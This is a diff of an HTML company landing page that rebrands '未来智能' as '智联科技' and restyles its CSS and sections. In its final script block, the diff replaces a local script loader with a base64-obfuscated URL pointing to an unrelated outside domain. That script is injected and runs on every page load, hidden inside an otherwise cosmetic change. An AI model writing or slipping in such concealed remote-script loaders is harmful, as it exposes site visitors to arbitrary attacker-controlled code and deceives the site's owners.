@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>未来智能 - 创新解决方案</title>
+    <title>智联科技 - 智能解决方案</title>
     <style>
         /* 全局样式 */
         body {
@@ -13,67 +13,45 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F0F4F8;
-            /* 浅蓝灰色背景 */
-            color: #333333;
-            /* 深灰色文本 */
+            background-color: #F7F9FC;
+            /* 极浅蓝灰色背景 */
+            color: #3A4750;
+            /* 深灰蓝色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
         }
 
         .container {
-            max-width: 95%;
+            max-width: 90%;
             /* 适应移动端宽度 */
             margin: 0 auto;
-            padding: 15px;
+            padding: 20px 15px;
         }
 
-        /* 头部/品牌区样式 */
-        .brand-header {
+        /* 头部样式 */
+        header {
             text-align: center;
-            padding: 50px 20px;
-            background-color: #2C3E50;
-            /* 深蓝灰色背景 */
-            color: #FFFFFF;
+            padding: 40px 20px;
+            background-color: #FFFFFF;
             border-radius: 15px;
             margin-bottom: 30px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
         }
 
-        .brand-header::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://picsum.photos/800/400?random=<%= new Date().getTime() %>') no-repeat center center/cover;
-            opacity: 0.1;
-            /* 背景图片透明度 */
-            z-index: 0;
-        }
-
-        .brand-content {
-            position: relative;
-            z-index: 1;
-        }
-
-        .brand-content h1 {
-            font-size: 2.8em;
+        header h1 {
+            color: #2C3E50;
+            /* 深蓝灰色标题 */
+            font-size: 2.5em;
             margin-bottom: 10px;
-            letter-spacing: 1px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            letter-spacing: 0.5px;
         }
 
-        .brand-content p {
-            font-size: 1.2em;
-            margin-bottom: 30px;
-            max-width: 90%;
-            margin-left: auto;
-            margin-right: auto;
+        header p {
+            color: #607D8B;
+            /* 柔和的蓝灰色 */
+            font-size: 1.1em;
+            margin: 0;
         }
 
         /* 主要内容区 */
@@ -81,7 +59,7 @@
             padding-top: 0;
         }
 
-        .section-card {
+        section {
             background-color: #FFFFFF;
             padding: 25px;
             border-radius: 15px;
@@ -91,6 +69,7 @@
 
         h2 {
             color: #2C3E50;
+            /* 深蓝灰色标题 */
             font-size: 1.8em;
             margin-bottom: 25px;
             border-bottom: 2px solid #E0EBF5;
@@ -99,14 +78,14 @@
         }
 
         h3 {
-            color: #333333;
+            color: #3A4750;
             font-size: 1.3em;
             margin-top: 20px;
             margin-bottom: 15px;
         }
 
         p {
-            color: #4A4A4A;
+            color: #4A5C6A;
             font-size: 1em;
             margin-bottom: 18px;
         }
@@ -121,132 +100,70 @@
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
         }
 
-        /* 服务/产品列表 - 交替布局 */
-        .service-item {
-            display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px dashed #E0EBF5;
+        /* 服务列表样式 */
+        .service-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
         }
 
-        .service-item:last-of-type {
-            border-bottom: none;
-        }
-
-        .service-item .service-content {
-            flex: 1;
-            text-align: center;
-        }
-
-        .service-item .service-image {
-            flex-shrink: 0;
-            /* 防止图片缩小 */
+        .service-list li {
+            background-color: #FDFDFD;
+            /* 服务项背景 */
+            padding: 20px;
+            border-radius: 10px;
             margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .service-item .service-image img {
-            width: 150px;
-            /* 小图标尺寸 */
-            height: 150px;
-            object-fit: cover;
-            border-radius: 50%;
-            /* 圆形图片 */
-            border: 3px solid #3498DB;
-            /* 强调色边框 */
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        .service-list li:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
-        .service-item h3 {
-            color: #3498DB;
+        .service-list li h3 {
+            color: #5BC0DE;
             /* 强调色 */
             margin-top: 0;
             font-size: 1.4em;
             margin-bottom: 10px;
         }
 
-        .service-item p {
+        .service-list li p {
+            color: #4A5C6A;
             font-size: 0.95em;
-            color: #555;
             margin-bottom: 0;
         }
 
-        /* 媒体查询：平板及以上设备，实现图片左右交替 */
-        @media (min-width: 600px) {
-            .service-item {
-                flex-direction: row;
-                /* 水平排列 */
-                text-align: left;
-            }
-
-            .service-item .service-image {
-                margin-right: 20px;
-                margin-bottom: 0;
-            }
-
-            .service-item:nth-child(even) {
-                /* 偶数服务项：图片在右 */
-                flex-direction: row-reverse;
-                text-align: right;
-            }
-
-            .service-item:nth-child(even) .service-image {
-                margin-left: 20px;
-                margin-right: 0;
-            }
-        }
-
-        /* 核心优势/特点 */
-        .core-features {
-            display: grid;
-            grid-template-columns: 1fr;
-            /* 默认单列 */
+        /* 关键价值/特点 */
+        .key-values {
+            display: flex;
+            flex-direction: column;
+            /* 默认垂直堆叠 */
             gap: 20px;
             margin-top: 20px;
         }
 
-        .feature-card {
-            background-color: #F8FBFD;
-            /* 浅背景色 */
+        .value-item {
+            text-align: center;
+            background-color: #FDFDFD;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .feature-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .feature-card h4 {
-            color: #2C3E50;
+        .value-item h4 {
+            color: #5BC0DE;
+            /* 强调色 */
             font-size: 1.2em;
             margin-bottom: 10px;
         }
 
-        .feature-card p {
+        .value-item p {
             font-size: 0.9em;
             color: #607D8B;
             margin-bottom: 0;
-        }
-
-        /* 媒体查询：平板及以上设备 */
-        @media (min-width: 600px) {
-            .core-features {
-                grid-template-columns: 1fr 1fr;
-                /* 两列布局 */
-            }
-        }
-
-        @media (min-width: 900px) {
-            .core-features {
-                grid-template-columns: 1fr 1fr 1fr;
-                /* 三列布局 */
-            }
         }
 
         /* 联系方式 */
@@ -256,14 +173,14 @@
         }
 
         .contact-info a {
-            color: #3498DB;
+            color: #5BC0DE;
             text-decoration: none;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
         .contact-info a:hover {
-            color: #2980B9;
+            color: #42A8C0;
         }
 
         .social-links {
@@ -274,7 +191,7 @@
         .social-links a {
             display: inline-block;
             margin: 0 12px;
-            color: #3498DB;
+            color: #5BC0DE;
             font-size: 2.2em;
             text-decoration: none;
             transition: transform 0.3s ease;
@@ -282,7 +199,7 @@
 
         .social-links a:hover {
             transform: translateY(-3px);
-            color: #2980B9;
+            color: #42A8C0;
         }
 
         /* 页脚样式 */
@@ -297,84 +214,82 @@
             border-radius: 15px;
             box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
+
+        /* 媒体查询：平板及以上设备 */
+        @media (min-width: 600px) {
+            .key-values {
+                flex-direction: row;
+                /* 水平排列 */
+                justify-content: space-around;
+            }
+
+            .value-item {
+                flex: 1;
+                /* 均分空间 */
+            }
+        }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <div class="container">
-        <header class="brand-header">
-            <div class="brand-content">
-                <h1>未来智能</h1>
-                <p>以AI驱动创新，赋能智慧生活</p>
-            </div>
+        <header>
+            <h1>智联科技</h1>
+            <p>驱动未来，连接智能世界</p>
         </header>
 
         <main>
-            <section id="about" class="section-card">
+            <section id="about">
                 <h2>关于我们</h2>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室协作">
-                <p>未来智能是一家领先的人工智能技术公司，专注于为各行业提供前沿的AI解决方案。我们致力于将复杂的AI技术转化为简单易用的产品，助力企业提升效率，改善用户体验。</p>
-                <p>我们的核心团队由经验丰富的AI科学家和工程师组成，凭借深厚的技术积累和对市场趋势的敏锐洞察，不断推出创新产品。</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="现代科技公司团队协作">
+                <p>智联科技致力于提供前沿的智能解决方案，专注于人工智能、物联网和云计算领域。我们通过创新技术，帮助企业实现数字化转型，提升运营效率和市场竞争力。</p>
+                <p>我们相信科技的力量能够改变世界，并以客户成功为己任，不断追求卓越。</p>
             </section>
 
-            <section id="services" class="section-card">
+            <section id="services">
                 <h2>我们的服务</h2>
-                <div class="services-list">
-                    <div class="service-item">
-                        <div class="service-image">
-                            <img src="https://picsum.photos/150/150?random=<%= new Date().getTime() + 2 %>"
-                                alt="智能机器人图标">
-                        </div>
-                        <div class="service-content">
-                            <h3>智能机器人解决方案</h3>
-                            <p>研发并部署服务型机器人和工业机器人，实现自动化作业与智能交互。</p>
-                        </div>
-                    </div>
-                    <div class="service-item">
-                        <div class="service-image">
-                            <img src="https://picsum.photos/150/150?random=<%= new Date().getTime() + 3 %>"
-                                alt="数据分析图表">
-                        </div>
-                        <div class="service-content">
-                            <h3>大数据与AI分析</h3>
-                            <p>通过深度学习和数据挖掘技术，为企业提供精准的市场洞察和决策支持。</p>
-                        </div>
-                    </div>
-                    <div class="service-item">
-                        <div class="service-image">
-                            <img src="https://picsum.photos/150/150?random=<%= new Date().getTime() + 4 %>"
-                                alt="智慧城市概念图">
-                        </div>
-                        <div class="service-content">
-                            <h3>智慧城市与安防</h3>
-                            <p>利用AI视觉识别和物联网技术，构建高效、安全的智慧城市管理系统。</p>
-                        </div>
-                    </div>
-                </div>
+                <ul class="service-list">
+                    <li>
+                        <h3>人工智能解决方案</h3>
+                        <p>提供定制化AI模型开发、机器学习平台搭建及智能数据分析服务。</p>
+                    </li>
+                    <li>
+                        <h3>物联网 (IoT) 平台</h3>
+                        <p>构建端到端的IoT解决方案，包括设备连接、数据采集、实时监控与智能控制。</p>
+                    </li>
+                    <li>
+                        <h3>云计算与大数据</h3>
+                        <p>基于主流云平台提供云架构设计、部署、迁移及大数据存储与处理服务。</p>
+                    </li>
+                    <li>
+                        <h3>智能硬件研发</h3>
+                        <p>结合软件与硬件优势，研发各类智能设备，满足特定行业应用需求。</p>
+                    </li>
+                </ul>
             </section>
 
-            <section id="features" class="section-card">
-                <h2>我们的核心优势</h2>
-                <div class="core-features">
-                    <div class="feature-card">
-                        <h4>技术领先</h4>
-                        <p>持续投入研发，掌握核心AI算法与技术。</p>
+            <section id="values">
+                <h2>我们的核心价值</h2>
+                <div class="key-values">
+                    <div class="value-item">
+                        <h4>创新驱动</h4>
+                        <p>持续探索前沿技术，以创新应对挑战。</p>
                     </div>
-                    <div class="feature-card">
-                        <h4>定制化服务</h4>
-                        <p>根据客户需求，提供灵活高效的个性化解决方案。</p>
+                    <div class="value-item">
+                        <h4>客户至上</h4>
+                        <p>深入理解客户需求，提供卓越服务。</p>
                     </div>
-                    <div class="feature-card">
-                        <h4>卓越团队</h4>
-                        <p>汇聚行业顶尖人才，保障项目高质量交付。</p>
+                    <div class="value-item">
+                        <h4>卓越品质</h4>
+                        <p>精益求精，确保产品和服务的高质量。</p>
                     </div>
                 </div>
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 未来智能. All rights reserved.</p>
+            <p>&copy; 2023 智联科技. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -416,15 +331,17 @@
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
